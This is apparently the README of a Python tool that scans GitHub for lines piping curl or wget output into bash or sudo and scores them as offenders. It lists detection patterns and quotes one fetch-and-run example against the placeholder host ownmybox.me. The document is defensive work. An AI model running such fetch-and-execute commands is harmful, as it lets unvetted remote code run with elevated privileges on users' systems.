This is a Python3 project that looks on github for offending curl2sudo lines
and dumps them to offenders.json.

The score is computed based on how 'bad' it is and is almost complete arbitrary.
Notes
=====

Properties that an offender probably has:

* curl or wget at the beginning of the line
* http or https somewhere in the line
* a bash or sh at the end
* a pipe symbol between the curl/wget and the bash/sh

Properties an offender may have:

* Fancy execution `bash < <(curl https://ownmybox.me/install.sh)`
* $1 or other weird ways to get an arbitrary URL

Properties and offender gets bonus points for:

* Having a sudo in the line (!!!)
* su somewhere in the line (less likely)

